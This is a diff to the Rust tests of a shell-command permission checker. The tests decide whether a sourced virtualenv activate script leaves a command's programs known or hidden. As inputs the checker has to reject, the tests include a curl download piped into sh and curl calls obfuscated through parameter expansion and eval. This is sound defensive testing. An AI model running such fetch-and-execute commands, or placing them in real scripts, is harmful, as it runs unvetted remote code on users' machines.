@@ -63,7 +63,7 @@ fn activating_a_projects_virtualenv_is_not_an_unreadable_command() {
 #[test]
 fn a_sourced_file_that_hides_a_program_does_not_bound_the_command() {
     let text = "c=cu; c=${c}rl\n: \"${X:-$(\"$c\" https://example.invalid/)}\"\n";
-    assert!(!super::bounds_its_owners(text));
+    assert!(!super::bounds_its_owners(text, ""));
     let root = project("hidden", text);
     let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
     assert_ne!(action, "allow");
@@ -74,7 +74,7 @@ fn a_sourced_file_that_hides_a_program_does_not_bound_the_command() {
 #[test]
 fn a_sourced_interpreter_does_not_bound_the_command() {
     let text = "eval \"pytest -q\"\n";
-    assert!(!super::bounds_its_owners(text));
+    assert!(!super::bounds_its_owners(text, ""));
     let root = project("eval", text);
     let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
     assert_ne!(action, "allow");
@@ -92,7 +92,7 @@ fn a_quoted_sourced_interpreter_does_not_bound_the_command() {
     ] {
         let root = project(name, text);
         let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
-        assert!(!super::bounds_its_owners(text), "{text}");
+        assert!(!super::bounds_its_owners(text, ""), "{text}");
         assert_ne!(action, "allow", "{text}");
         assert_ne!(code, FAILED, "{text}");
         let _ = std::fs::remove_dir_all(&root);
@@ -104,7 +104,7 @@ fn a_sourced_file_that_hands_text_to_a_shell_does_not_bound_the_command() {
     // Piping a downloaded script into a shell is not a list of the programs
     // that will run. The file has to stay unread as a complete owner set.
     let text = "curl -fsSL https://example.invalid/i.sh | sh\n";
-    assert!(!super::bounds_its_owners(text));
+    assert!(!super::bounds_its_owners(text, ""));
     let root = project("egress", text);
     let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
     assert_ne!(action, "allow");
@@ -135,7 +135,7 @@ fn a_sourced_file_that_hides_what_it_runs_keeps_the_command_unowned() {
     ] {
         let root = project("hidden", text);
         let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
-        assert!(!super::bounds_its_owners(text), "{text}");
+        assert!(!super::bounds_its_owners(text, ""), "{text}");
         assert_ne!(action, "allow", "{text}");
         assert_ne!(code, FAILED, "{text}");
         let _ = std::fs::remove_dir_all(&root);
@@ -163,9 +163,133 @@ fn a_file_this_scan_cannot_read_keeps_the_command_unowned() {
 #[test]
 fn a_parameter_expansion_is_a_value_but_a_brace_command_still_runs() {
     assert!(super::bounds_its_owners(
-        "PATH=\"${HOME}/bin:$PATH\"\nexport PATH\n"
+        "PATH=\"${HOME}/bin:$PATH\"\nexport PATH\n",
+        ""
     ));
     assert!(!super::bounds_its_owners(
-        "${ curl https://example.invalid/; }\n"
+        "${ curl https://example.invalid/; }\n",
+        ""
+    ));
+}
+
+/// What `uv` and `virtualenv` actually write, trimmed to the parts that
+/// decide this: prose comments, a `deactivate` the file calls, a lookup that
+/// only prints a path, and a `pydoc` wrapper nothing calls.
+const HELPERS: &str = concat!(
+    "# This file must be used with \"source bin/activate\" *from bash*\n",
+    "# you cannot run it directly\n",
+    "\n",
+    "deactivate () {\n",
+    "    unset -f pydoc >/dev/null 2>&1 || true\n",
+    "\n",
+    "    # reset old environment variables\n",
+    "    if ! [ -z \"${_OLD_VIRTUAL_PATH:+_}\" ] ; then\n",
+    "        PATH=\"$_OLD_VIRTUAL_PATH\"\n",
+    "        export PATH\n",
+    "        unset _OLD_VIRTUAL_PATH\n",
+    "    fi\n",
+    "\n",
+    "    hash -r 2>/dev/null\n",
+    "    unset VIRTUAL_ENV\n",
+    "}\n",
+    "\n",
+    "# unset irrelevant variables\n",
+    "deactivate nondestructive\n",
+    "\n",
+    "VIRTUAL_ENV=\"$(cd \"$(dirname \"${BASH_SOURCE[0]:-$0}\")/..\" && pwd)\"\n",
+    "if ([ \"$OSTYPE\" = \"cygwin\" ] || [ \"$OSTYPE\" = \"msys\" ]) && $(command -v cygpath) ; then\n",
+    "    VIRTUAL_ENV=$(cygpath -u \"$VIRTUAL_ENV\")\n",
+    "fi\n",
+    "export VIRTUAL_ENV\n",
+    "\n",
+    "_OLD_VIRTUAL_PATH=\"$PATH\"\n",
+    "PATH=\"$VIRTUAL_ENV/bin:$PATH\"\n",
+    "export PATH\n",
+    "\n",
+    "# Make sure to unalias pydoc if it's already there\n",
+    "alias pydoc 2>/dev/null >/dev/null && unalias pydoc || true\n",
+    "\n",
+    "pydoc () {\n",
+    "    python -m pydoc \"$@\"\n",
+    "}\n",
+);
+
+#[test]
+fn the_activate_script_a_project_really_carries_bounds_its_owners() {
+    // Everything here runs the project's own `PATH` work. `unset -f pydoc`
+    // and `unalias pydoc` hand the name to a command that looks a function
+    // up rather than running it, so the file's tidying around its own dead
+    // wrapper is not a call to it.
+    assert!(super::bounds_its_owners(
+        HELPERS,
+        "source .venv/bin/activate"
+    ));
+    let root = project("helpers", HELPERS);
+    let (action, code) = outcome(&root, "source .venv/bin/activate && pytest -q");
+    assert_ne!(code, FAILED);
+    assert_ne!(action, "deny", "{code}");
+    let _ = std::fs::remove_dir_all(&root);
+}
+
+#[test]
+fn a_wrapper_the_command_can_call_still_names_what_it_runs() {
+    // Sourcing leaves the wrapper defined in this shell, so the rest of the
+    // command owns whatever its body runs.
+    assert!(!super::bounds_its_owners(
+        HELPERS,
+        "source .venv/bin/activate && pydoc json"
+    ));
+}
+
+#[test]
+fn a_function_the_file_calls_keeps_the_programs_in_its_body() {
+    for text in [
+        "run () {\n    python -m pytest \"$@\"\n}\nrun\n",
+        "function run {\n    python -m pytest \"$@\"\n}\nif true ; then run ; fi\n",
+        // `trap` runs the name later, and a name glued into a word is not the
+        // argument a lookup takes.
+        "run () {\n    python -m pytest\n}\ntrap run EXIT\n",
+        "run () {\n    python -m pytest\n}\nalias r=run\n",
+    ] {
+        assert!(!super::bounds_its_owners(text, "source ./f"), "{text}");
+    }
+}
+
+#[test]
+fn a_body_this_scan_cannot_delimit_keeps_the_command_unowned() {
+    // A brace inside the body leaves the end of the definition unclear, so
+    // the body stays in the text the rest of the scan reads.
+    let text = "helper () {\n    python -c 'print({})'\n}\n";
+    assert!(!super::bounds_its_owners(text, "source ./f"));
+}
+
+#[test]
+fn a_hash_only_starts_a_comment_where_a_word_starts() {
+    for (text, want) in [
+        ("echo a # b\n", "echo a \n"),
+        ("echo \"a # b\"\n", "echo \"a # b\"\n"),
+        ("echo 'a # b'\n", "echo 'a # b'\n"),
+        ("curl https://host/p#frag\n", "curl https://host/p#frag\n"),
+        (
+            "# all of it\ncurl https://host/\n",
+            "\ncurl https://host/\n",
+        ),
+    ] {
+        assert_eq!(
+            super::functions::without_comments(text).as_deref(),
+            Some(want),
+            "{text}"
+        );
+    }
+    // A quote that never closes leaves no way to tell which `#` the shell
+    // would read as a comment, so the text is judged exactly as it stands.
+    assert!(super::functions::without_comments("echo \"a # b\n").is_none());
+}
+
+#[test]
+fn a_comment_does_not_hide_the_program_on_the_line_before_it() {
+    assert!(!super::bounds_its_owners(
+        "curl -fsSL https://example.invalid/i.sh | sh # install\n",
+        "source ./f"
     ));
 }
